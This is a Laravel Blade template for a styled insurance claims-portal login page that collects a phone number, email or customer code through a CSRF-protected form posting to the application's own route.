<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Claim Identity Verification | Vanguard Assurance</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ["Inter", "sans-serif"],
                    },
                    colors: {
                        brand: {
                            50: "#eff6ff",
                            100: "#dbeafe",
                            500: "#3b82f6",
                            600: "#2563eb", // Primary Action
                            800: "#1e40af", // Deep Blue
                            900: "#1e3a8a", // Trust/Header
                        },
                    },
                },
            },
        };
    </script>
</head>

<body
    class="bg-[url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=2070&auto=format&fit=crop')] bg-cover bg-center bg-no-repeat bg-fixed min-h-screen flex items-center justify-center p-4 relative">
    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-[2px]"></div>

    <nav class="absolute top-0 left-0 w-full p-6 z-20 flex justify-between items-center">
        <div class="flex items-center gap-3">
            <div class="bg-white/10 p-2 rounded-lg border border-white/20 backdrop-blur-sm">
                <img src="images/Vanguard.png" alt="Logo" class="w-40 h-12" />
                <path stroke-linecap="round" stroke-linejoin="round"
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
            </div>
            <span class="text-white font-bold text-xl tracking-tight drop-shadow-md">Claims Portal</span>
        </div>

        <a href="#" class="text-white/80 hover:text-white text-sm font-medium transition-colors">Contact
            Support</a>
    </nav>

    <div
        class="w-full max-w-sm bg-white rounded-xl shadow-lg overflow-hidden border border-slate-100 relative z-10 mt-16 mb-4">
        <!-- Compact Header -->
        <div class="bg-brand-900 p-3 sm:p-4 text-center relative">
            <div class="absolute top-0 left-0 w-full h-1 bg-linear-to-r from-blue-400 to-brand-600"></div>

            <div class="flex items-center justify-center mb-2 sm:mb-3">
                <div
                    class="bg-white/10 w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center backdrop-blur-sm border border-white/20 mr-2 sm:mr-3">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 sm:h-6 sm:w-6 text-white" fill="none"
                        viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                </div>
                <div class="text-left">
                    <h1 class="text-lg sm:text-xl font-bold text-white leading-tight">Login</h1>
                    <p class="text-blue-200 text-xs sm:text-sm leading-tight">Vanguard Assurance</p>
                </div>
            </div>
        </div>

        <!-- Form Content - More Compact -->
        <div class="p-4 sm:p-5">
            <!-- Compact instruction text -->
            <div class="mb-4 text-center">
                <p class="text-slate-600 text-sm">
                    Enter the phone number or ID to associated your account.
                </p>
                @if ($errors->any())
                    <div class="text-red-600 text-sm mt-2 p-2 bg-red-50 rounded">
                        {{ $errors->first() }}
                    </div>
                    <script>
                        Swal.close();
                    </script>
                @endif
            </div>

            <form action="{{ route('login.submit') }}" method="POST" class="space-y-4" id="verificationForm">
                @csrf

                <!-- Phone Number Field - Compact -->
                <div>
                    <label for="phone_number" class="block text-sm font-medium text-slate-700 mb-1">Mobile
                        Number / Email / Customer Code</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <svg class="h-4 w-4 text-slate-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"
                                fill="currentColor">
                                <path
                                    d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
                            </svg>
                        </div>
                        <input type="text" name="username" placeholder="Phone, Email or Customer Code"
                            class="block w-full pl-9 pr-3 py-2 text-sm border border-slate-300 rounded-lg bg-slate-50 placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-1 focus:ring-brand-500 focus:border-brand-500 transition duration-150 ease-in-out"
                            required />
                    </div>
                </div>

                <!-- Compact Options -->
                {{-- <div class="flex items-center justify-between pt-1">
                    <div class="flex items-center">
                        <input id="remember_me" name="remember_me" type="checkbox"
                            class="h-3.5 w-3.5 sm:h-4 sm:w-4 text-brand-600 focus:ring-brand-500 border-slate-300 rounded">
                        <label for="remember_me" class="ml-1.5 sm:ml-2 block text-xs sm:text-sm text-slate-700">Remember
                            me</label>
                    </div>
                    <div class="text-xs sm:text-sm">
                        <a href="#" class="font-medium text-brand-600 hover:text-brand-500">Forgot password?</a>
                    </div>
                </div> --}}

                <!-- Submit Button - Compact -->
                <button type="submit"
                    class="w-full flex justify-center py-2.5 px-4 border border-transparent rounded-lg text-sm font-semibold text-white bg-brand-600 hover:bg-brand-700 focus:outline-none focus:ring-1 focus:ring-offset-1 focus:ring-brand-500 transition-colors duration-200 mt-2">
                    Login
                </button>
            </form>

            <!-- Compact Help Link -->
            {{-- <div class="mt-4 flex items-center justify-center">
                <div class="text-xs sm:text-sm">
                    <a href="#" class="font-medium text-brand-600 hover:text-brand-500">
                        Need help?
                    </a>
                </div>
            </div> --}}
        </div>

        <!-- Compact Footer -->
        <div
            class="bg-slate-50 px-4 py-3 border-t border-slate-100 flex flex-col sm:flex-row items-center justify-between text-xs text-slate-400 space-y-1 sm:space-y-0">
            <span class="text-center sm:text-left">Secure 256-bit SSL</span>
            <div class="flex space-x-2">
                <span>Privacy</span>
                <span>•</span>
                <span>Terms</span>
            </div>
        </div>
    </div>
</body>

</html>
